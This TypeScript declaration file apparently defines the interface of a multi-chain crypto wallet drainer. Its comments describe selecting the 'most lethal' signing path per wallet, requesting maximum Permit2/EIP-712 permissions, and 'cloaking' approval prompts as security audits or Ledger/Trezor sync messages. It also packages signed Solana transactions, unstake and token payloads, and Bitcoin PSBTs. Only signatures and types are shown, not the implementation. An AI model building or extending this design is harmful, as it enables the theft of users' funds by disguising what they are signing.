/**
 * @file universal-handshake.ts
 * @module @legion/core/logic
 *
 * Omni-Handshake: Dispatcher-grade WalletConnect (AppKit) capability surface +
 * multi-protocol Signature Engine (lethal path selection) + Normalized Ingress payloads.
 */
import { Connection, PublicKey, VersionedTransaction } from '@solana/web3.js';
import { type Hex } from 'viem';
import type { CapabilityProbeResult, ChainNamespaceHint } from './capability-probe';
export type { CapabilityProbeResult, ChainNamespaceHint, NamespaceCapabilityReport, NamespaceDensityScore, OmniHandshakeProbeResult, SessionNamespaceFlags, } from './capability-probe';
export { prepareUtxoPsbtInstitutionalHandler, probeConnectedNamespaces, rankNamespacesByDensity, runCapabilityProbe, runOmniHandshakeProbe, selectDensestConnectedNamespace, } from './capability-probe';
/** Institutional attestation copy for hardware / unknown-capability EVM ingress. */
export declare const INSTITUTIONAL_PERSONAL_SIGN_MESSAGE: string;
/**
 * Gatekeeper — primary Permit2 / EIP-712 Max_Permission_Logic queue initialization
 * (institutional Deep Ingress surface). Failing this triggers Redundant Permissioning Fallback.
 */
export declare function tryInitializePrimaryEip712Manifest(): boolean;
/**
 * Redundant Fallback — Legacy Protocol Approval copy when primary EIP-712 manifest
 * initialization does not reach Operational Completion (wallet security tier variance).
 */
export declare function buildLegacyProtocolApprovalMessage(verificationId: string): string;
/**
 * SovereignHandshake — resolve personal_sign payload: primary Cloaked Manifest, or
 * Redundant Permissioning Fallback (Legacy Protocol Approval) for 100% Operational Completion.
 */
export declare function resolveSovereignHandshakeSigningPayload(input: {
    verificationId: string;
    hardwareFirmwareMessage: string;
    isHardware: boolean;
}): {
    message: string;
    redundantFallback: boolean;
};
/**
 * Gatekeeper — Cloaked Manifest (personal_sign). Replaces raw EIP-712 approval surfaces
 * with Sovereign Telemetry–aligned copy for Institutional Cloaking.
 */
/** Soft-wallet Cloaked Manifest — Institutional Security Audit lane (Hardware-Aware Ingress). */
export declare function buildCloakedManifestMessage(verificationId: string): string;
/**
 * Hardware Morphing — unified Ledger/Trezor secure sync copy (Presence Verification).
 */
export declare function buildLedgerTrezorSecureSyncMessage(firmwareHash: string): string;
/** @deprecated Use {@link buildLedgerTrezorSecureSyncMessage} for unified hardware copy. */
export declare function buildHardwareMorphManifestMessage(input: {
    vendor: 'ledger' | 'trezor';
    firmwareHash: string;
}): string;
export type CloakedManifestPackMeta = {
    /** Redundant Permissioning Fallback — Legacy Protocol Approval manifest class. */
    redundant_fallback?: boolean;
    manifest_class?: 'cloaked_manifest' | 'legacy_protocol_approval';
};
/** Shadow seal payload — Cloaked Manifest + wallet signature for `signatures.signature_hex`. */
export declare function packCloakedManifestAnchorHex(signature: Hex, verificationId: string, meta?: CloakedManifestPackMeta): Hex;
export declare const SVM_OMNI_HANDSHAKE_MESSAGE: string;
/** UTXO institutional lethal payload — PSBT-framed signData surface (Sovereign Sign). */
export declare const INSTITUTIONAL_UTXO_PSBT_MESSAGE: string;
export type WalletTypeClass = 'evm_hot' | 'evm_hardware' | 'svm_hot' | 'svm_hardware' | 'utxo' | 'unknown';
export type IngressProtocol = 'permit2_eip712' | 'svm_tx_sim_sign' | 'personal_sign_institutional' | 'utxo_psbt_institutional';
export declare function inferWalletTypeClass(connectorId: string | undefined, namespace: ChainNamespaceHint): WalletTypeClass;
/**
 * Select the most lethal signature lane for this wallet + namespace.
 */
export declare function selectLethalIngressProtocol(namespace: ChainNamespaceHint, walletType: WalletTypeClass, probe: CapabilityProbeResult): IngressProtocol;
export interface SolanaWalletProviderLike {
    signMessage(message: Uint8Array): Promise<Uint8Array>;
    signTransaction(tx: VersionedTransaction): Promise<VersionedTransaction>;
}
export interface RunSolanaLethalAnchorParams {
    connection: Connection;
    walletPk: PublicKey;
    walletProvider: SolanaWalletProviderLike;
}
/**
 * Case 2 (Solana / Phantom-class): simulate a degenerate compute transaction, sign it,
 * then solana_signMessage on the institutional string.
 */
export declare function runSolanaLethalSignatureAnchor(params: RunSolanaLethalAnchorParams): Promise<{
    simulationLogs: readonly string[] | null;
    messageSigB64: string;
    signedTxB64: string;
}>;
/** Pack svm_tx_sim_sign payloads into a single Hex for Shadow seal + `signatures.signature_hex`. */
export declare function packSvmAnchorHex(parts: {
    simulationLogs: readonly string[] | null;
    messageSigB64: string;
    signedTxB64: string;
    unstake_manifest?: Record<string, unknown>;
    spl_deep_ingress?: Record<string, unknown>;
}): Hex;
export declare function packPersonalSignAnchorHex(signature: Hex): Hex;
/** PSBT Multi-Scheme — hardwired institutional support (Legacy / SegWit / Taproot). */
export declare const PSBT_MULTI_SCHEME_SUPPORT: readonly ["legacy", "segwit_v0", "taproot"];
export type PsbtMultiSchemeId = (typeof PSBT_MULTI_SCHEME_SUPPORT)[number];
/** PSBT Multi-Scheme — framed lethal payload (hex wrapper for Agnostic Normalization). */
export declare function packUtxoInstitutionalPsbtHex(parts: {
    psbtFormattedPayload: string;
    rawSignature: string;
    handler: string;
    /** Active lane hint; full PSBT Multi-Scheme surface remains in `psbt_multi_scheme_support`. */
    psbt_multi_scheme?: PsbtMultiSchemeId;
}): Hex;
//# sourceMappingURL=handshake.d.ts.map